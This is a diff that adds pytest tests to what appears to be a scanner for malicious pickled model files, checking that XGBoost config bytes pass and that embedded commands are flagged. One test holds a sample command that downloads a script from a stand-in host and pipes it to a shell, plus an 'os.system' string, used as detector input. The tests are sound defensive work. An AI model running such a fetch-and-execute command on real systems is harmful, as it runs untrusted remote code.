@@ -172,3 +172,15 @@ def test_url_in_png_text_outside_a_namespace_is_still_flagged(tmp_path):
     assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", "https://example.invalid/p", "", ""))))
     xmp = '<x:xmpmeta xmlns:x="adobe:ns:meta/"><a href="https://example.invalid/p"/></x:xmpmeta>'
     assert flagged(worst(tmp_path, build(Call("PIL.PngImagePlugin.iTXt", xmp, "", ""))))
+
+
+def test_xgboost_config_bytearray_is_data(tmp_path):
+    # XGBoost pickles a Booster's config as bytearray(b'{"Config": ...}'), the
+    # way bytes(...) carries raw data (autotrain joblib model, November 2026).
+    config = b'{"Config":{"learner":{"generic_param":{"n_jobs":"60"}}},"version":[1,5,2]}'
+    assert not flagged(worst(tmp_path, build(Call("builtins.bytearray", config))))
+
+
+def test_command_in_a_bytearray_is_still_flagged(tmp_path):
+    assert flagged(worst(tmp_path, build(Call("builtins.bytearray", b"curl http://x.example/a | sh"))))
+    assert flagged(worst(tmp_path, build(Call("builtins.bytearray", b"os.system"))))
